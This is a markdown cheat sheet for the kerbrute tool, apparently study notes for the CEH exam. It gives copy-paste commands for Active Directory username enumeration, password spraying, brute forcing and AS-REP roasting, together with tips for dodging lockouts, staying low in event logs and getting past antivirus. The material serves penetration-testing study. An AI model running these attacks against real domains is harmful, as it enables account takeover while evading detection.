# kerbrute — fast Kerberos user enum + password spray

> **The AD username oracle.** Asks the KDC "does user X exist?" by sending an AS-REQ and reading the pre-auth error code — **no account lockout, no login event** (until you spray). Beats hydra/medusa against AD because it never triggers the bad-password counter on enumeration. Go-to for CEH v12/v13 AD workflows when you have a DC IP but no creds yet.

**Install check:** `kerbrute --help`
**Install (pre-built binary):**
```bash
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 -O /usr/local/bin/kerbrute
sudo chmod +x /usr/local/bin/kerbrute
```
Not packaged on Parrot by default.

---

## 🎯 Cheat-flow: "Given just a DC, what AD accounts exist?"

| Goal | Command |
|---|---|
| **Enumerate valid usernames** | `kerbrute userenum -d corp.local --dc 192.168.52.10 users.txt` |
| **Spray one password to many users** | `kerbrute passwordspray -d corp.local --dc 192.168.52.10 users.txt 'Summer2026!'` |
| **Brute one user, many passwords** | `kerbrute bruteuser -d corp.local --dc 192.168.52.10 passes.txt alice` |
| **Brute user:pass combos** | `kerbrute bruteforce -d corp.local --dc 192.168.52.10 combos.txt` (format `user:pass`) |

---

## 🔑 Subcommands

| Subcommand | What it does |
|---|---|
| `userenum` | Send AS-REQ per user — distinguish "user exists" from "user doesn't exist" via error codes; **no failed-login event**, no lockout |
| `passwordspray` | Try one password against many users (low-and-slow to dodge lockout) |
| `bruteuser` | Try many passwords against one user (**does trigger lockout**) |
| `bruteforce` | Try arbitrary `user:pass` combos from a file |
| `version` | Print version |

## 🔑 Common flags

| Flag | Meaning |
|---|---|
| `-d <domain>` | **Target domain** (FQDN, e.g. `corp.local`) |
| `--dc <IP\|FQDN>` | **Domain controller** — required; speeds things up |
| `-t <n>` | Threads (default 10) |
| `-o <file>` | Write valid/successful results to file |
| `-v` | Verbose (show the raw Kerberos error codes) |
| `--delay <ms>` | Delay between attempts (lockout-dodge) |
| `--safe` | Abort immediately if account lockout detected |
| `--downgrade` | Downgrade encryption to RC4 (legacy AD) |
| `-h` | Help for subcommand |

---

## 📋 Command recipes (copy-paste)

```bash
# 0. Build a user list — several options, pick one
# 0a. From jsmith.txt-style lists (SecLists)
cp /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt users.txt
# 0b. From BloodHound dump
# 0c. From OSINT (LinkedIn → firstname.lastname)

# 1. Username enum — the safe first step
kerbrute userenum -d corp.local --dc 192.168.52.10 users.txt

# 2. Save valid users to file (used downstream)
kerbrute userenum -d corp.local --dc 192.168.52.10 users.txt -o valid_users.txt

# 3. Password spray — one password, many users, with delay
kerbrute passwordspray -d corp.local --dc 192.168.52.10 \
  valid_users.txt 'Winter2026!' --delay 1000

# 4. Spray with a small list of common passwords
for pw in 'Password1' 'Welcome1' 'Summer2026' 'Corp2026!'; do
  kerbrute passwordspray -d corp.local --dc 192.168.52.10 valid_users.txt "$pw" --safe
  sleep 60  # respect lockout window
done

# 5. Brute one known user (dangerous — triggers lockout!)
kerbrute bruteuser -d corp.local --dc 192.168.52.10 \
  /usr/share/wordlists/rockyou.txt alice

# 6. combo file: alice:Password1, bob:Summer2025, ...
kerbrute bruteforce -d corp.local --dc 192.168.52.10 combos.txt

# 7. Verbose = see raw error codes
kerbrute userenum -v -d corp.local --dc 192.168.52.10 users.txt
```

---

## 🧠 Reading the output

| kerbrute says | What it means |
|---|---|
| `[+] VALID USERNAME: alice@corp.local` | User exists (pre-auth required) |
| `[+] VALID LOGIN: bob@corp.local:Password1` | Auth succeeded (spray/brute mode) |
| `[+] bob has no pre-auth required!` | **AS-REP roastable** — feed to `GetNPUsers.py` / hashcat -m 18200 |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | User does NOT exist |
| `KDC_ERR_PREAUTH_FAILED` | User exists, wrong password |
| `KDC_ERR_CLIENT_REVOKED` | **Account locked / disabled** — stop spraying! |
| `KRB_AP_ERR_SKEW` | Clock skew > 5 min — `sudo ntpdate <DC_IP>` |

---

## 🎯 CEH exam patterns

**"Enumerate valid AD users without triggering lockouts":**
```bash
kerbrute userenum -d corp.local --dc <DC_IP> users.txt
```

**"Password spray with a seasonal password":**
```bash
kerbrute passwordspray -d corp.local --dc <DC_IP> valid_users.txt 'Winter2026!' --safe
```

**"Identify AS-REP roastable users":**
kerbrute prints `has no pre-auth required!` during userenum when it hits one. Then:
```bash
impacket-GetNPUsers corp.local/ -usersfile valid_users.txt -no-pass -dc-ip <DC>
hashcat -m 18200 asrep.hash rockyou.txt
```

---

## 🆚 Why kerbrute beats hydra/medusa for AD

| Feature | kerbrute | hydra/medusa SMB |
|---|---|---|
| User enum without login attempt | ✅ (AS-REQ pre-auth) | ❌ (every probe = login attempt) |
| Triggers lockout on enum | ❌ **no** | ✅ yes |
| Generates 4625 failed-login events | Only on spray/brute, not enum | Every probe |
| Speed on AD (per sec) | 100s–1000s | ~10s |
| Cross-platform (one binary) | ✅ | depends on build |

Rule: **userenum is free intel** — always run it first, then spray only validated accounts.

---

## ⚠️ Gotchas

- **DC FQDN sometimes required** — if `--dc 192.168.52.10` fails with DNS error, use the hostname: `--dc dc01.corp.local` + `/etc/hosts` entry.
- **Clock skew** >5 min breaks Kerberos entirely. Sync: `sudo ntpdate <DC_IP>` or `sudo rdate -n <DC_IP>`.
- **`bruteuser` causes lockouts.** Default AD policy = 5 bad in 30 min. Use `--delay` or switch to `passwordspray` with one pass at a time.
- **Userenum doesn't always stay invisible** — AD still logs Kerberos ticket events (4768). It's low-log, not zero-log.
- **Case matters for domain** in some AD setups — try both `corp.local` and `CORP.LOCAL`.
- **Pre-built binary blocked by AV** on some lab boxes — rename, or build from source: `go install github.com/ropnop/kerbrute@latest`.
- **No SPN enum** — kerbrute doesn't do Kerberoasting; use [impacket](impacket.md) `GetUserSPNs.py` for that.
- **Threads too high** (`-t 50`) can DoS a small lab DC. Default 10 is safer.

---

## 🔗 Related

- [impacket](impacket.md) — `GetNPUsers.py` (AS-REP) and `GetUserSPNs.py` (Kerberoast) use the user list kerbrute builds
- [crackmapexec](crackmapexec.md) — validates creds once spray hits; use `--continue-on-success` for spraying
- [bloodhound](bloodhound.md) — feed valid users once you have creds
- [hydra](hydra.md) — fallback for non-AD services (SSH/FTP/RDP)
- [hashcat](hashcat.md) — crack the AS-REP / TGS hashes you get
- [05-system-hacking domain README](../05-system-hacking/README.md)
